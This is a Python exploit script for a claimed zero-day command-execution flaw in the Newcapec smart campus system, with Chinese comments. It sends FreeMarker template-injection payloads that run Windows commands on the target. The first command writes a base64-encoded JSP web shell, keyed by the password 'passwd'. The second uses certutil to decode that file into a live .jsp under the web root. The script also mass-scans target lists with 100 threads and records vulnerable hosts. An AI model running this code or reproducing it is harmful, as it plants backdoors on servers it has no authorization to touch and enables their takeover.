#新开普智慧校园系统命令执行漏洞[HW 0DAY]

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""    __  ___       __    ____  ____  _____  __
   / / / / |     / /   / __ \/ __ \/   \ \/ /
  / /_/ /| | /| / /   / / / / / / / /| |\  / 
 / __  / | |/ |/ /   / /_/ / /_/ / ___ |/ /  
/_/ /_/  |__/|__/____\____/_____/_/  |_/_/   
               /_____/                      author:CHKer
                                            version:1.0.0

 """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='新开普智慧校园系统命令执行漏洞[HW 0DAY]')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/service_transport/service.action'
    headers={
         'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Cookie':'JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
    }

    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    #上传木马。密码passwd
    data={"command": "GetFZinfo","UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+ >./webapps/ROOT/1.txt\")}"}
    
    #将txt文件重命名为jsp文件
    data1={"command": "GetFZinfo", 
        "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c certutil -decode ./webapps/ROOT/1.txt ./webapps/ROOT/1.jsp\")}"}
    try:
        res1=requests.post(url=target+payload,headers=headers,proxies=proxies,verify=False,data=data)
        res2=requests.post(url=target+payload,headers=headers,proxies=proxies,verify=False,data=data1)
        if res2.status_code==200 and '本次处理完成，请求数据为空' in res2.text:
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()
